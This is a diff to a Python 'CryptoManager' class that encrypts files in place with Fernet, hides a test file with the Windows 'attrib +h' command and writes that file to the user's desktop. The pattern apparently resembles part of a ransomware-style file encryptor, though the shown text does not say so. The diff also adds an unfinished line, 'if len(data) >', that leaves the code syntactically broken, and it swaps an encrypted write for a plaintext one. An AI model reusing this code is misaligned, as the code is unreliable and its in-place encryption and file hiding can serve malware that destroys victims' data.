@@ -1,8 +1,9 @@
 from cryptography.fernet import Fernet
 import subprocess
 from Utils import Utils
-import oschmod
 import traceback
+import winshell
+import os
 
 # TODO test in different size and type of files
 class CryptoManager(Utils):
@@ -23,9 +24,10 @@ class CryptoManager(Utils):
             except:
                 print('test.txt cannot revealed')
                 traceback.print_exc()
-                
-            with open('test.txt', 'wb') as test_file:
-                test_file.write(enc_msg)
+            
+            desktop_path = winshell.desktop()
+            with open(os.path.join(desktop_path, 'test.txt'), 'wb') as test_file:
+                test_file.write(msg)
                 
             try:
                 subprocess.check_call(['attrib', '+h', 'test.txt'])
@@ -92,6 +94,7 @@ class CryptoManager(Utils):
     def symmetric_encrypt_or_decrypt(self, full_path, opt='encrypt'):
         try:
             data = self.load_data(full_path)
+            if len(data) > 
             if opt == 'encrypt':
                 encrypted_data = self.fernet.encrypt(data)
                 self.save_data(full_path, encrypted_data)
